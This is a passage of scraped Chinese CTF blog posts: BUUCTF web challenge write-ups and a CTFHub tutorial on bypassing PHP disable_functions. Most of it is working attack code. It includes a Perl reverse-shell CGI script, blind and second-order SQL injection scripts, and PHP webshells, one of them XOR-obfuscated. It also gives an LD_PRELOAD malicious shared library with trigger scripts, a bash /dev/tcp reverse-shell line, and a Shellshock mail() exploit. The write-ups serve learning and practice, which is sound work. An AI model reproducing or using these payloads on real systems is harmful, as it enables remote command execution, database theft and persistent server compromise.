qr(^127\\.0\\.0\\.1$);# Declarationsmy $global_page = \"\";my $fake_process_name = \"/usr/sbin/apache\";# Change the process name to be less conspicious$0 = \"[httpd]\";# Authenticate based on source IP address if requiredif (defined($ENV{'REMOTE_ADDR'})) { cgiprint(\"Browser IP address appears to be: $ENV{'REMOTE_ADDR'}\"); if ($auth) { unless ($ENV{'REMOTE_ADDR'} =~ $authorised_client_pattern) { cgiprint(\"ERROR: Your client isn't authorised to view this page\"); cgiexit(); } }} elsif ($auth) { cgiprint(\"ERROR: Authentication is enabled, but I couldn't determine your IP address. Denying access\"); cgiexit(0);}# Background and dissociate from parent process if requiredif ($daemon) { my $pid = fork(); if ($pid) { cgiexit(0); # parent exits } setsid(); chdir('/'); umask(0);}# Make TCP connection for reverse shellsocket(SOCK, PF_INET, SOCK_STREAM, getprotobyname('tcp'));if (connect(SOCK, sockaddr_in($port,inet_aton($ip)))) { cgiprint(\"Sent reverse shell to $ip:$port\"); cgiprintpage();} else { cgiprint(\"Couldn't open reverse shell to $ip:$port: $!\"); cgiexit(); }# Redirect STDIN, STDOUT and STDERR to the TCP connectionopen(STDIN, \"&gt;&amp;SOCK\");open(STDOUT,\"&gt;&amp;SOCK\");open(STDERR,\"&gt;&amp;SOCK\");$ENV{'HISTFILE'} = '/dev/null';system(\"w;uname -a;id;pwd\");exec({\"/bin/sh\"} ($fake_process_name, \"-i\"));# Wrapper around printsub cgiprint { my $line = shift; $line .= \"&lt;p&gt;\\n\"; $global_page .= $line;}# Wrapper around exitsub cgiexit { cgiprintpage(); exit 0; # 0 to ensure we don't give a 500 response.}# Form HTTP response using all the messages gathered by cgiprint so farsub cgiprintpage { print \"Content-Length: \" . length($global_page) . \"\\r Connection: close\\r Content-Type: text\\/html\\r\\n\\r\\n\" . $global_page;} 然后利用代码的逻辑构造payload： /?url=your vps's perl backdoor&amp;filename=URI/ggb0n.pm 这就在沙箱文件夹的URL下写入了反弹shell的pm文件，最后在个人的VPS上监听pm文件中写好的端口并构造如下的payload进行访问： /?url=GGBON://ggb0n.com&amp;filename=xxx 即可拿到shell。注意：这里的GGBON可以为任意的不属于上面说到的可以解析的字符串。 利用perl的open命令进行SSRF首先扩展一下open命令导致命令执行的过程，参考网上的资料： Executing Programs with “open”In addition to what we saw last week, the “open” command has one more verypowerful application: it allows you to execute a command, send input andreceive output.Try this program (it only works on Unix): #!/usr/bin/perl -w use strict; open DATA, \"who |\" or die \"Couldn't execute program: $!\"; while ( defined( my $line = &lt;DATA&gt; ) ) { chomp($line); print \"$line\\n\"; } close DATA; Here’s what happened: Perl saw that your “file” ended with a “pipe” (verticalbar) character. So it interpreted the “file” as a command to be executed, and interpreted the command’s output as the “file”‘s contents. The command is “who” (which prints information on currently logged-in users). If you execute that command, you will see that the output is exactly what the Perl program gave you. In this case, we “read” data from the command. To execute a command that we can “write” (send data) to, we should place a pipe character BEFORE the command. These options are mutually exclusive: we can read from a command or write to it, but not both. In the Unix world, a lot can be done by piping the output of one program into the input of another. Perl continues this spirit. Note that we can also send command-line parameters to the command, like this: open DATA, \"who -H |\" or die \"Couldn't execute program: $!\"; In fact, Perl allows you to use “open” to do pretty much anything you would normally do on the command-line, as this example demonstrates: open OUTPUT, \"| grep 'foo' &gt; result.txt\" or die \"Failure: $!\"; We can then write whatever we want to the “OUTPUT” filehandle. The Unix “grep” command will filter out any text which doesn’t contain the text “foo”; any text which DOES contain “foo” will be written to “result.txt”. perl下open命令的feature代码处理file协议的代码在perl5/LWP/Protocol/file.pm下： ...#第47行 # test file exists and is readable unless (-e $path) { return HTTP::Response-&gt;new( &amp;HTTP::Status::RC_NOT_FOUND, \"File `$path' does not exist\"); } unless (-r _) { return HTTP::Response-&gt;new( &amp;HTTP::Status::RC_FORBIDDEN, 'User does not have read permission'); }...#第127行 # read the file if ($method ne \"HEAD\") { open(F, $path) or return new HTTP::Response(&amp;HTTP::Status::RC_INTERNAL_SERVER_ERROR, \"Cannot read file '$path': $!\"); binmode(F); $response = $self-&gt;collect($arg, $response, sub { my $content = \"\"; my $bytes = sysread(F, $content, $size); return \\$content if $bytes &gt; 0; return \\ \"\"; }); close(F); }... 首先得满足前面的文件存在, 才会继续到open语句, 所以在执行命令前得保证有相应的同名文件, 所以先请求： /?url=file:bash -c /readflag|&amp;filename=bash -c /readflag| 然后请求如下的payload来创建相应的同名文件： /?url=file:bash -c /readflag|&amp;filename=123 最后利用open的feature执行代码访问/sandbox/哈希值/123就能得到flag。 其实还不是很懂，先留在这，再慢慢学习。 [RoarCTF 2019]Online ProxyXFF处存在二次注入 解题进入题目查看源码发现： &lt;!-- Debug Info: Duration: 0.029144048690796 s Current Ip: 174.0.81.45 --&gt; 这里提示当前的IP，想到利用工具改一下XFF试试，结果发现回显如下： &lt;!-- Debug Info: Duration: 0.035063982009888 s Current Ip: 127.0.0.1 Last Ip: 174.0.81.45 --&gt; 说明了上一个IP被记录了起来，当然也只能是记录在数据库中，那么如果构造一个SQL注入语句的XFF头上传，然后再随便换一个XFF头访问，不就是可以出发二次注入了吗，最终用赵师傅的脚本跑出了结果。参考赵师傅的脚本： import requeststarget = \"http://node3.buuoj.cn:28041/\"def execute_sql(sql): print(\"[*]请求语句：\" + sql) return_result = \"\" payload = \"0'|length((\" + sql + \"))|'0\" session = requests.session() r = session.get(target, headers={'X-Forwarded-For': payload}) r = session.get(target, headers={'X-Forwarded-For': 'glzjin'}) r = session.get(target, headers={'X-Forwarded-For': 'glzjin'}) start_pos = r.text.find(\"Last Ip: \") end_pos = r.text.find(\" --&gt;\", start_pos) length = int(r.text[start_pos + 9: end_pos]) print(\"[+]长度：\" + str(length)) for i in range(1, length + 1, 5): payload = \"0'|conv(hex(substr((\" + sql + \"),\" + str(i) + \",5)),16,10)|'0\" r = session.get(target, headers={'X-Forwarded-For': payload}) # 将语句注入 r = session.get(target, headers={'X-Forwarded-For': 'glzjin'}) # 查询上次IP时触发二次注入 r = session.get(target, headers={'X-Forwarded-For': 'glzjin'}) # 再次查询得到结果 start_pos = r.text.find(\"Last Ip: \") end_pos = r.text.find(\" --&gt;\", start_pos) result = int(r.text[start_pos + 9: end_pos]) return_result += bytes.fromhex(hex(result)[2:]).decode('utf-8') print(\"[+]位置 \" + str(i) + \" 请求五位成功:\" + bytes.fromhex(hex(result)[2:]).decode('utf-8')) return return_result# 获取数据库print(\"[+]获取成功：\" + execute_sql(\"SELECT group_concat(SCHEMA_NAME) FROM information_schema.SCHEMATA\"))# 获取数据库表print(\"[+]获取成功：\" + execute_sql(\"SELECT group_concat(TABLE_NAME) FROM information_schema.TABLES WHERE TABLE_SCHEMA = 'F4l9_D4t4B45e'\"))# 获取数据库表print(\"[+]获取成功：\" + execute_sql(\"SELECT group_concat(COLUMN_NAME) FROM information_schema.COLUMNS WHERE TABLE_SCHEMA = 'F4l9_D4t4B45e' AND TABLE_NAME = 'F4l9_t4b1e' \"))# 获取表中内容print(\"[+]获取成功：\" + execute_sql(\"SELECT group_concat(F4l9_C01uMn) FROM F4l9_D4t4B45e.F4l9_t4b1e\")) [Black Watch 入群题]Web考察异或注入 题目分析进入题目看到如下的界面：点击热点列表里面的字的时候会跳转到另一个页面，同时还有登录页面，起初猜测是注入是在登录页面，那里通过JSON对username和password进行传参，前面做了JSON中进行注入的题目，但是这道题的注入点其实是在跳转的那个页面，抓包可以发现：这个页面是利用GET方式直接进行id传参的，存在注入的可能性更大，后来印证是异或注入，用脚本跑。 解题脚本import requestsimport urllibimport sysfrom time import sleep# if correct , return empty, else return somethingurl = \"http://c385297f-15e1-4d95-a39b-3f2aa03b3822.node3.buuoj.cn/backend/content_detail.php?id=\"#payload = \"1^(ord(substr((select(group_concat(table_name))from(information_schema.tables)where(table_schema=database())),{0},1))&gt;{1})\"# [+] --&gt;admin,contents&lt;--#payload = \"1^(ord(substr((select(group_concat(column_name))from(information_schema.columns)where(table_name='contents')),{0},1))&gt;{1})\"# id,title,content,is_enable#payload = \"1^(ord(substr((select(group_concat(column_name))from(information_schema.columns)where(table_name='admin')),{0},1))&gt;{1})\"# id,username,password,is_enable#payload = \"1^(ord(substr((select(group_concat(password))from(admin)),{0},1))&gt;{1})\"payload = \"1^(ord(substr((select(group_concat(username))from(admin)),{0},1))&gt;{1})\"result = \"\"index = 1while True: u_bound = 255; l_bound = 0 while u_bound &gt;= l_bound: m_bound = (u_bound + l_bound) // 2 payload_tmp = payload.format(index, m_bound) url_tmp = url + urllib.parse.quote(payload_tmp) res = requests.get(url_tmp).content.decode('utf8') # print(res) # exit(0) # sleep(1) if \"title\" in res: u_bound = m_bound - 1 tmp = m_bound else: l_bound = m_bound + 1 # print(tmp) result += chr(tmp) index += 1 # sys.stdout.write(\"[+] --&gt;%s&lt;--\\r\" % (result)) # sys.stdout.flush() print(result) 跑出来两组用户名和密码，组合尝试就行了。 [HarekazeCTF2019]encode_and_encode考察通过JSON转义字符串绕过 题目分析进入题目，在第三个按钮看到源码： &lt;?phperror_reporting(0);if (isset($_GET['source'])) { show_source(__FILE__); exit();}function is_valid($str) { $banword = [ // no path traversal '\\.\\.', // no stream wrapper '(php|file|glob|data|tp|zip|zlib|phar):', // no data exfiltration 'flag' ]; $regexp = '/' . implode('|', $banword) . '/i'; if (preg_match($regexp, $str)) { return false; } return true;}$body = file_get_contents('php://input');$json = json_decode($body, true);if (is_valid($body) &amp;&amp; isset($json) &amp;&amp; isset($json['page'])) { $page = $json['page']; $content = file_get_contents($page); if (!$content || !is_valid($content)) { $content = \"&lt;p&gt;not found&lt;/p&gt;\\n\"; }} else { $content = '&lt;p&gt;invalid request&lt;/p&gt;';}// no data exfiltration!!!$content = preg_replace('/HarekazeCTF\\{.+\\}/i', 'HarekazeCTF{&amp;lt;censored&amp;gt;}', $content);echo json_encode(['content' =&gt; $content]); 通过审计代码发现，is_valid()函数中通过黑名单过滤了一些字符串，基本上都是可能用到的协议。然后我们发现body的值是通过file_get_contents('php://input')传过来的，查了一下涨知识了： 如果POST的原始数据是一维数组或&amp;拼接的标准格式的键值对字符串，那么可以用$_POST来获取。如果发送json字符串，一般要通过file_get_contents获取。 因为这里是通过JSON编码传输的，因此用这种方式，然后对body的值进行解码并赋值给json。然后再利用自定义的is_valid()函数进行判断，并且可以看出json中有page这个键值对。思路就很明显了，我们需要通过JSON传输数据来读取到flag，这里就需要用到php的伪协议了，但是php已经被ban了，但是的但是：\\uXXXX可以在JSON中转义字符，例如A=\\u0041，因此利用这个特性来进行绕过。 解题最终构造的payload如下： {\"page\":\"\\u0070\\u0068\\u0070://filter/convert.base64-encode/resource=/\\u0066\\u006c\\u0061\\u0067\"}/* \\u0070\\u0068\\u0070表示php；\\u0066\\u006c\\u0061\\u0067表示flag */ 成功拿到flag： [CISCN 2019]Easyweb敏感文件泄露，文件上传时短标签绕过php过滤 题目分析进入题目，访问robots.txt发现源码备份文件，下载到iamge.php.bak，源码如下： &lt; ?phpinclude \"config.php\";$id=isset($_GET[\"id\"])?$_GET[\"id\"]:\"1\";$path=isset($_GET[\"path\"])?$_GET[\"path\"]:\"\";$id=addslashes($id);$path=addslashes($path);$id=str_replace(array(\"\\\\0\",\"%00\",\"\\\\'\",\"'\"),\"\",$id);$path=str_replace(array(\"\\\\0\",\"%00\",\"\\\\'\",\"'\"),\"\",$path);$result=mysqli_query($con,\"select * from images where id='{$id}' or path='{$path}'\");$row=mysqli_fetch_array($result,MYSQLI_ASSOC);$path=\"./\" . $row[\"path\"];header(\"Content-Type: image/jpeg\");readfile($path); 审计代码发现应该需要进行sql注入，但是单引号被过滤掉了。由于转义函数addslashes的存在，同时\\0、'被过滤，所以可以输入\\0，经过addslashes函数会先变成\\\\0,然后经过str_replace函数，会变成\\，这样，就把id后面的单引号给转义了。所以可以构造类似下面的payload： http://a215b254-c237-4670-a4cc-9dfea3d34f26.node3.buuoj.cn/image.php?id=\\0'&amp;path= or 1=1%23 后台执行的sql语句便是： select * from images where id='\\' or path=' or 1=1# 从而绕过了过滤，那么利用这一点写脚本注入： import requestsimport timename=''for j in range(1,21): l = 32 h = 127 while abs(l-h)&gt;1: i=int((l+h)/2) url=\"http://a215b254-c237-4670-a4cc-9dfea3d34f26.node3.buuoj.cn/image.php?id=\\\\0'&amp;path= or ascii(substr((select password from users),\"+str(j)+\",1))&gt;\"+str(i)+\"%23\" r = requests.get(url) time.sleep(0.005) if r.status_code=='429': print('to fast') if not 'Content-Length' in r.headers: l = i else: h = i name += chr(h)print(name) 拿到密码之后，用admin身份登录，发现需要进行文件上传，并且会将文件名和用户名写入日志文件。由于日志文件的格式是php的，因此考虑写入shell。这里由于用户名已经是admin不可变的，那就需要在文件名上做手脚，但是文件名进行了php/i的过滤，此处利用短标签绕过： filename=\"&lt;?=$_GET['cmd']; eval($_POST['cmd']); ?&gt;\" 关于短标签扩展一下： 短标签&lt;? ?&gt;需要php.ini开启short_open_tag = On，但&lt;?= ?&gt;不受该条控制。 上传小马之后，得到如下的文件名，然后蚁剑连接拿到shell，即可拿到flag。 [GXYCTF2019]BabySQli考察点：多次编码(base32、base64)，union select注入结合md5通过后台判断。 题目分析随便输入用户名密码后，查看源码发现一串base32： MMZFM422K5HDASKDN5TVU3SKOZRFGQRRMMZFM6KJJBSG6WSYJJWESSCWPJNFQSTVLFLTC3CJIQYGOSTZKJ2VSVZRNRFHOPJ5 解码之后： c2VsZWN0ICogZnJvbSB1c2VyIHdoZXJlIHVzZXJuYW1lID0gJyRuYW1lJw== 再通过base64解码： select * from user where username = '$name' 由此可见，在username处存在注入点。用常规的注入测试一下： ' union select 1,2,3%23 提示wrong user，接着我们把admin分别替换1、2、3的位置，发现替换2的时候报错变成wrong pass说明了username就是在第二个位置，原题提示了md5，肯定是对密码进行了哈希，那么可以推断，3处应该替换为密码的哈希值。那么我们利用上面的语句，再把随便输入的密码的md5值替换到3的位置，在后头就能构成满足后端判断的查询语句了。 解题随便找个密码以及密码的md5值，这里用的是123456/e10adc3949ba59abbe56e057f20f883e，最终payload如下： ' union select 1,'admin','e10adc3949ba59abbe56e057f20f883e'%23 username处输入payload，password输入123456即可拿到flag。 [SUCTF 2018]GetShell利用异或构造webshell，参考上一篇博客的知识点。fuzz脚本 &lt;?phpheader('Content-Type: text/html; charset=utf-8');$str = '当我站在山顶上俯瞰半个鼓浪屿和整个厦门的夜空的时候，我知道此次出行的目的已经完成了，我要开始收拾行李，明天早上离开这里。前几天有人问我，大学四年结束了，你也不说点什么？乌云发生了一些事情，所有人都缄默不言，你也是一样吗？你逃到南方，难道不回家了吗？当然要回家，我只是想找到我要找的答案。其实这次出来一趟很累，晚上几乎是热汗淋漓回到住处，厦门的海风伴着妮妲路过后带来的淅淅沥沥的小雨，也去不走我身上任何一个毛孔里的热气。好在旅社的生活用品一应俱全，洗完澡后我爬到屋顶。旅社是一个老别墅，说起来也不算老，比起隔壁一家旧中国时期的房子要豪华得多，竖立在笔山顶上与厦门岛隔海相望。站在屋顶向下看，灯火阑珊的鼓浪屿街市参杂在绿树与楼宇间，依稀还可以看到熙熙攘攘的游客。大概是夜晚渐深的缘故，周围慢慢变得宁静下来，我忘记白天在奔波什么，直到站在这里的时候，我才知道我寻找的答案并不在南方。当然也不在北方，北京的很多东西让我非常丧气，包括自掘坟墓的中介和颐指气使的大人们；北京也有很多东西让我喜欢，我喜欢颐和园古色古香的玉澜堂，我喜欢朝阳门那块“永延帝祚”的牌坊，喜欢北京鳞次栉比的老宅子和南锣鼓巷的小吃。但这些都不是我要的答案，我也不知道我追随的是什么，但想想百年后留下的又是什么，想想就很可怕。我曾经为了吃一碗臭豆腐，坐着优步从上地到北海北，兴冲冲地来到那个垂涎已久的豆腐摊前，用急切又害羞的口吻对老板说，来两份量的臭豆腐。其实也只要10块钱，吃完以后便是无与伦比的满足感。我记得那是毕业设计审核前夕的一个午后，五月的北京还不算炎热，和煦的阳光顺着路边老房子的屋檐洒向大地，但我还是不敢站在阳光下，春天的燥热难耐也绝不输给夏天。就像很多人冷嘲热讽的那样，做这一行谁敢把自己完全曝光，甭管你是黑帽子白帽子还是绿帽子。生活在那个时候还算美好，我依旧是一个学生，几天前辞别的同伴还在朝九晚五的工作，一切都照旧运行，波澜不远走千里吃豆腐这种理想主义的事情这几年在我身上屡屡发生，甚至南下此行也不例外。一年前的这个时候我许过一个心愿，在南普陀，我特为此来还愿。理想化、单纯与恋旧，其中单纯可不是一个多么令人称赞的形容，很多人把他和傻挂钩。“你太单纯了，你还想着这一切会好起来”，对呀，在男欢女爱那些事情上，我可不单纯，但有些能让人变得圆滑与世故的抉择中，我宁愿想的更单纯一些。去年冬天孤身一人来到北京，放弃了在腾讯做一个安逸的实习生的机会，原因有很多也很难说。在腾讯短暂的实习生活让我记忆犹新，我感觉这辈子不会再像一个小孩一样被所有人宠了，这些当我选择北漂的时候应该就要想到的。北京的冬天刺骨的寒冷，特别是2015年的腊月，有几天连续下着暴雪，路上的积雪一踩半步深，咯吱咯吱响，周遭却静的像深山里的古刹。我住的小区离公司有一段距离，才下雪的那天我甚至还走着回家。北京的冬天最可怕的是寒风，走到家里耳朵已经硬邦邦好像一碰就会碎，在我一头扎进被窝里的时候，我却慢慢喜欢上这个古都了。我想到《雍正皇帝》里胤禛在北京的鹅毛大雪里放出十三爷，那个拼命十三郎带着令牌取下丰台大营的兵权，保了大清江山盛世的延续与稳固。那一夜，北京的漫天大雪绝不逊于今日，而昔人已作古，来者尚不能及，多么悲哀。这个古都承载着太多历史的厚重感，特别是下雪的季节，我可以想到乾清宫前广场上千百年寂寞的雕龙与铜龟，屋檐上的积雪，高高在上的鸱吻，想到数百年的沧桑与朝代更迭。雪停的那天我去了颐和园，我记得我等了很久才摇摇摆摆来了一辆公交车，车上几乎没有人，司机小心翼翼地转动着方向盘，在湿滑的道路上缓慢前行。窗外白茫茫一片，阳光照在雪地上有些刺眼，我才低下头。颐和园的学生票甚至比地铁票还便宜。在昆明湖畔眺望湖面，微微泛着夕阳霞光的湖水尚未结冰，踩着那些可能被御碾轧过的土地，滑了无数跤，最后只能扶着湖边的石狮子叹气，为什么没穿防滑的鞋子。昆明湖这一汪清水，见证了光绪皇帝被囚禁十载的蹉跎岁月，见证了静安先生誓为先朝而自溺，也见证了共和国以来固守与开放的交叠。说起来，家里有本卫琪著的《人间词话典评》，本想买来瞻仰一下王静安的这篇古典美学巨著，没想到全书多是以批判为主。我自诩想当文人的黑客，其实也只是嘴里说说，真到评说文章是非的时候，我却张口无词。倒是誓死不去发，这点确实让我无限感慨：中国士大夫的骨气，真的是从屈原投水的那一刻就奠定下来的。有句话说，古往今来中国三大天才死于水，其一屈原，其二李白，其三王国维。卫琪对此话颇有不服，不纠结王国维是否能够与前二者相提并论，我单喜欢他的直白，能畅快评说古今词话的人，也许无出其右了吧。人言可畏、人言可畏，越到现代越会深深感觉到这句话的正确，看到很多事情的发展往往被舆论所左右，就越羡慕那些无所畏惧的人，不论他们是勇敢还是自负。此间人王垠算一个，网络上人们对他毁誉参半，但确实有本事而又不矫揉做作，放胆直言心比天高的只有他一个了。那天在昆明湖畔看过夕阳，直到天空变的无比深邃，我才慢慢往家的方向走。耳机放着后弦的《昆明湖》，不知不觉已经十年了，不知道这时候他有没有回首望望自己的九公主和安娜，是否还能够“泼墨造一匹快马，追回十年前姑娘”。后来，感觉一切都步入正轨，学位证也顺利拿到，我匆匆告别了自己的大学。后来也遇到了很多事，事后有人找我，很多人关心你，少数人可能不是，但出了学校以后，又有多少人和事情完全没有目的呢？我也考虑了很多去处，但一直没有决断，倒有念怀旧主，也有妄自菲薄之意，我希望自己能做出点成绩再去谈其他的，所以很久都是闭门不出，琢磨东西。来到厦门，我还了一个愿，又许了新的愿望，希望我还会再次来还愿。我又来到了上次没住够的鼓浪屿，订了一间安静的房子，只有我一个人。在这里，能听到的只有远处屋檐下鸟儿叽叽喳喳的鸣叫声，远处的喧嚣早已烟消云散，即使这只是暂时的。站在屋顶的我，喝下杯中最后一口水。清晨，背着行李，我乘轮渡离开了鼓浪屿，这是我第二次来鼓浪屿，谁知道会不会是最后一次。我在这里住了三天，用三天去寻找了一个答案。不知不觉我又想到辜鸿铭与沈子培的那段对话。“大难临头，何以为之？”“世受国恩，死生系之。”';for($i=0; $i&lt;mb_strlen($str, 'utf-8'); $i++){ $st = mb_substr($str, $i,1, 'utf-8'); $a = ~($st); $b = $a[1]; #取汉字的第一位 if($b==$_GET['a']) #$_GET['a']想要得到的字符 { echo $st;exit; } }?&gt; 构造webshell &lt;?php $__=[]; $___=[]; $_=$__==$___;//true = 1 用作索引 $__=~(瞰); $___=$__[$_];//a $__=~(北); $___.=$__[$_].$__[$_];//ss $__=~(的); $___.=$__[$_];//e $__=~(半); $___.=$__[$_];//r $__=~(拾); $___.=$__[$_];//t $____=~(~(_));//_ $__=~(说); $____.=$__[$_];//P $__=~(小); $____.=$__[$_];//O $__=~(次); $____.=$__[$_];//S $__=~(站); $____.=$__[$_];//T $_=$$____; $___($_[_]); ?&gt; 这题还没复现成功，后续会补充…","link":"/2020/02/15/BUUCTF-web%E5%88%B7%E9%A2%98%E2%85%A2/"},{"title":"CTFHub-bypass_functions_disable","text":"不得不说，Line师傅们在技能树里安排的这个分支真是太棒了！作为一名菜鸡，之前只是对bypass functions_disable有比较少并且不清晰的理解，但是刷了这部分题相当于系统地学习了一遍，帮助很大！ 现在的web题中functions_disable很常见，很多时候都会苦于小马上传、蚁剑连上之后不能读flag文件内容、终端也执行不了命令…这个时候就肯定是进行了functions_disable，需要我们尝试各种姿势来bypass了。 通过这篇博客，好好记录一下各种绕过姿势的学习。 LD_PRELOAD主要考察利用Linux的环境变量LD_PRELOAD来进行functions_disable的bypass。 关于利用LD_PRELOAD bypass LD_PRELOAD是与载入函数库相关的环境变量,它的作用便是在程序运行前优先加载指定的函数库。 每个程序执行的时候会去动态链接库so文件里面找函数的位置，而我们的目的是让程序去执行我们自定义的动态链接库，这样就相当于在正常程序中进行function_disable禁用诸如system之前便执行了系统命令。 结合上述两点，我们就可以自定义一个so文件上传，然后再用一个php的脚本来激活并达到反弹shell的目的。 利用条件 1、支持putenv 2、支持mail、imap_mail、mb_send_mail或error_log 3、存在可写的目录，需要上传.so文件 bypass流程 1、在Linux下生成含有恶意代码的动态链接程序 2、通过php脚本利用putenv来设置LD_PRELOAD，使得优先调用我们构造的恶意动态链接程序 3、通过上述的php脚本触发恶意代码，以达到反弹shell的目的 首先，构造的动态链接程序的代码如下： #include &lt;stdlib.h&gt;__attribute__((constructor)) void Z2diMG4=(){ unsetenv(\"LD_PRELOAD\"); if (getenv(\"cmd\") != NULL){ system(getenv(\"cmd\")); } else{ system(\"echo 'Hello' &gt; /hackfile\"); }} 构造php触发脚本： 这里常用的有两种方式：Sendmail+LD_PRELOAD和error_log+LD_PRELOAD，如果服务端没有禁止mail的使用，就可以用前者，反之可以使用后者。 Sendmail+LD_PRELOAD：sendmail会调用geteuid()，因此可以进行劫持，详细知识参考这里。 触发脚本如下： &lt;?php putenv(\"cmd=ls &gt; hackfile\"); putenv(\"LD_PRELOAD=/tmp/hack.so\"); mail(\"\",\"\",\"\",\"\",\"\");?&gt; 将so文件传到/tmp文件夹是因为这个文件夹用户是可以进行写入的，自己也可以找别的文件夹来灵活构造。 error_log+LD_PRELOAD：当题目环境不支持mail的时候，即可利用error_log来触发劫持，本题就需要用这种方法。 触发脚本如下： &lt;?php putenv(\"cmd=ls &gt; hackfile\"); putenv(\"LD_PRELOAD=/tmp/hack.so\"); error_log(\"a\",1); mail(\"a@localhost\",\"\",\"\",\"\",\"\");?&gt; 另外当题目环境存在gnupg拓展的时候还可以利用php的gnupg_init()函数来触发，可以在phpinfo中看到，脚本如下： &lt;?php putenv(\"cmd=ls &gt; hackfile\"); putenv(\"LD_PRELOAD=/tmp/hack.so\"); gnupg_init();?&gt; 注意上面脚本中执行的命令是将ls执行的结果重定向到hackfile中来查看，当然也可以通过如下的代码来拿到shell： &lt;?php putenv(\"cmd=/bin/bash -c 'bash -i &gt;&amp; /dev/tcp/host/port 0&gt;&amp;1'\"); putenv(\"LD_PRELOAD=/tmp/hack.so\"); mail(\"\",\"\",\"\",\"\",\"\");?&gt; 解题进入题目，源码中给了部分源码： 源码中提示已经存在小马了，且秘钥是ant，直接拿到蚁剑里连接能连上，但是flag文件无法访问，开终端也无法执行命令： 肯定是system被ban了，需要进行functions_disable的bypass。 有两种方法：利用蚁剑自带的插件或者自己手工bypass 利用蚁剑插件 这个有要求：自己的环境必须是Linux的，因为它要用gcc去编译so文件。 这个要求满足之后便可以在插件市场中下载functions_disablebypass的插件，然后选择LD_PRELOAD进行bypass就行了。 这里有官方详解 手动bypass 首先利用前面提到的C代码，利用下面两条命令生成so文件： gcc -c -fPIC ld_preload.c -o ld_preloadgcc --share ld_preload -o ld_preload.so 同时用上述的代码构造好触发的php脚本： &lt;?php //putenv(\"cmd=ls &gt; hackfile\"); putenv(\"cmd=/readflag &gt; hackfile\"); putenv(\"LD_PRELOAD=/tmp/ld_preload.so\"); error_log(\"a\",1); mail(\"a@localhost\",\"\",\"\",\"\",\"\");?&gt; 把so文件上传到/tmp/文件夹下，触发脚本上传到/var/www/html/下 然后在浏览器访问我们写入的触发脚本，然后回到蚁剑查看效果： 可以看到hackfile文件已经存在了，打开即可拿到flag 关于这种bypass姿势，网上很多，以下几个写的全面一些：https://www.freebuf.com/articles/web/192052.htmlhttps://www.dazhuanlan.com/2020/01/06/5e128867c6c74/ ShellShock主要考察利用bash破壳漏洞来执行命令，进行functions_disable的bypass 关于利用ShellShock bypass 该姿势主要是借助了bash破壳（CVE-2014-6271）漏洞，直接导致我们可以利用mail()函数执行任意命令，绕过disable_functions。 利用条件 1、支持putenv 2、支持mail、imap_mail、mb_send_mail或error_log 3、/bin/bash 存在 CVE-2014-6271 漏洞 4、/bin/sh -&gt; /bin/bash sh 默认的 shell 是 bash bypass流程 1、编写shellshock利用脚本并上传 2、浏览器访问上传的脚本进行反弹shell 在网上找到了两版脚本代码： //蚁剑提供的&lt;?phpfunction runcmd($c){ $d = dirname($_SERVER[\"SCRIPT_FILENAME\"]); if(substr($d, 0, 1) == \"/\" &amp;&amp; function_exists('putenv') &amp;&amp; (function_exists('error_log') || function_exists('mail'))){ if(strstr(readlink(\"/bin/sh\"), \"bash\")!=FALSE){ $tmp=tempnam(sys_get_temp_dir(), 'as'); putenv(\"PHP_LOL=() { x; }; $c &gt;$tmp 2&gt;&amp;1\"); if (function_exists('error_log')) { error_log(\"a\", 1); }else{ mail(\"a@127.0.0.1\", \"\", \"\", \"-bv\"); } }else{ print(\"Not vuln (not bash)\\n\"); } $output = @file_get_contents($tmp); @unlink($tmp); if($output!=\"\"){ print($output); }else{ print(\"No output, or not vuln.\"); } }else{ print(\"不满足使用条件\"); }}// runcmd(\"whoami\"); // 要执行的命令runcmd($_REQUEST[\"cmd\"]); // ?cmd=whoami?&gt; 以及下面这个： &lt;?php # Exploit Title: PHP 5.x Shellshock Exploit (bypass disable_functions) # Google Dork: none # Date: 10/31/2014 # Exploit Author: Ryan King (Starfall) # Vendor Homepage: http://php.net # Software Link: http://php.net/get/php-5.6.2.tar.bz2/from/a/mirror # Version: 5.* (tested on 5.6.2) # Tested on: Debian 7 and CentOS 5 and 6 # CVE: CVE-2014-6271 function shellshock($cmd) { // Execute a command via CVE-2014-6271 @mail.c:283 $tmp = tempnam(\".\",\"data\"); putenv(\"PHP_LOL=() { x; }; $cmd &gt;$tmp 2&gt;&amp;1\"); // In Safe Mode, the user may only alter environment variableswhose names // begin with the prefixes supplied by this directive. // By default, users will only be able to set environment variablesthat // begin with PHP_ (e.g. PHP_FOO=BAR). Note: if this directive isempty, // PHP will let the user modify ANY environment variable! mail(\"a@127.0.0.1\",\"\",\"\",\"\",\"-bv\"); // -bv so we don't actuallysend any mail $output = @file_get_contents($tmp); @unlink($tmp); if($output != \"\") return $output; else return \"No output, or not vuln.\"; } echo shellshock($_REQUEST[\"cmd\"]); ?&gt; 然后通过蚁剑上传的web目录并访问，不出问题即可通过cmd传参执行命令。 解题进入题目还是那个页面： 上蚁剑，同样不能通过终端执行命令，查看一下phpinfo： 发现是PHP5+版本，因此可以利用shellshock进行bypass，两种方式：蚁剑插件 or 手工… 利用蚁剑插件参考这里。 手工bypass利用上述代码构造exp脚本，上传并访问，即可拿到shell，通过控制cmd参数内容来进行命令执行。 话说，我做这题的时候这样用没成功…后来用l3m0n师傅的脚本打通的… 这里提一下l3m0n师傅脚本中的FUZZ脚本(就是那个名为shell.php的脚本)，上传这个脚本到web文件夹下，访问即可FUZZ出可以利用的点： 然后借助了apache_mod_cgi的解题方式最终拿到的flag。 可参考：https://www.secpulse.com/archives/2300.html Apache Mod CGI主要考察利用apache mod_cgi模块结合.htaccess对functions_disable进行bypass 关于利用Apache_Mod_CGI bypass 在apache的WEB环境中，经常会使用.htaccess来确定某个目录下的URL重写规则，特别是一些开源的CMS或者框架当中经常会用到，比如著名的开源论坛discuz!，就可以通过.htaccess文件实现URL的静态化，大部分PHP框架，例如ThinkPHP和Laravel，在apache环境下会用.htaccess文件实现路由规则。但是如果.htaccess文件被攻击者修改的话，攻击者就可以利用apache的mod_cgi模块，直接绕过PHP的任何限制，来执行系统命令。 利用条件 1、Linux 操作系统 2、Apache +PHP (apache 使用apache_mod_php) 3、Apache 开启了 cgi, rewrite 4、Web 目录给了 AllowOverride 权限 bypass流程 1、phpinfo查看服务端的配置是否支持cgi 2、配置.htaccess文件并上传 3、上传反弹shell的文件 配置.htaccess文件如下(参考蚁剑给出的策略)： Options +ExecCGIAddHandler cgi-script .ant 反弹shell文件代码： #!/bin/shecho&amp;&amp;cd &quot;/var/www/html&quot;;ls -al;echo [S];pwd;echo [E]//注意是.ant后缀 